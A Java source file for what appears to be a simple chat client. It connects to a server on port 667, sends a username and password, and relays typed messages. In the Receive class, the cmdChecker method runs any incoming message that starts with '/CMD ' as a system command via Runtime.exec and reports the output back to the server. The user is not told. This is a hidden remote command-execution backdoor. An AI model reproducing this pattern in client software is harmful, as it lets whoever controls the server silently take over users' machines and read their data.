package com.magnesiumm.Client;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.Socket;
import java.util.Scanner;

public class Client {

		public static String hostIP = "localhost";
		public static String username = "";
		public static String password = "";
		public static Socket socket;
		public static PrintStream printStream;
		
		public static void main(String [] args) {
			Scanner scan = new Scanner(System.in);
			System.out.println("Host IP: " + hostIP);
			System.out.println("Please enter your username: ");
			username = scan.nextLine();
			System.out.println("Please enter your password (if operating without an account, simply press enter): ");
			password = scan.nextLine();
			System.out.println("Thank you, attempting to connect.");
		
			try {
				socket = new Socket(hostIP, 667);
				Thread send = new Send();
				Thread receive = new Receive();
				receive.start();
				send.start();	
			
			} catch(Exception e) {
				e.printStackTrace();
			}
		}
}

class Send extends Thread {
	
	public void run() {
		try {
			
			Client.printStream = new PrintStream(Client.socket.getOutputStream());
			Client.printStream.println(Client.username + "," + Client.password);
			String output = "";
				while(true) {
					Scanner scan = new Scanner(System.in);
					output = scan.nextLine();
					send(output);
				}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	public static void send(String message) {
		Client.printStream.println(message);
	}
}

class Receive extends Thread {
	public void run() {
		try {
			InputStreamReader inputStreamReader = new InputStreamReader(Client.socket.getInputStream());
			BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
			String input = "";
			while(true) {
				input = bufferedReader.readLine();
				if (cmdChecker(input) == false) {
					System.out.println(input);
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public boolean cmdChecker(String input) {
		if(input.equals("/cmd_stop")) {
			System.exit(0);
		}
		if(input.equals("/cmd_removed")) {
			System.out.println("You have been removed.");
			try {
				Thread.sleep(2000);
			} catch (Exception e) {
				e.printStackTrace();
			}
			System.exit(0);
		}
		boolean toReturn = false;
		try {
			if((input.substring(0, input.indexOf(" "))).equals("/CMD")) {
				toReturn = true;
				Runtime runTime = Runtime.getRuntime();
				String command = input.substring(input.indexOf(" ")+1);
				Process process = runTime.exec(command); 
				InputStreamReader rawOutput = new InputStreamReader(process.getInputStream());
				BufferedReader output = new BufferedReader(rawOutput);
				String out;
				
				while ((out = output.readLine()) != null){
					Send.send("/cmd_report " + out);
				}
				return true;
			}
		} catch (Exception e) {
			if(toReturn == true) {
				Send.send("/cmd_report " + e);
				return toReturn;
			} else {
				return toReturn;
			}
		}
		return false;
	}
}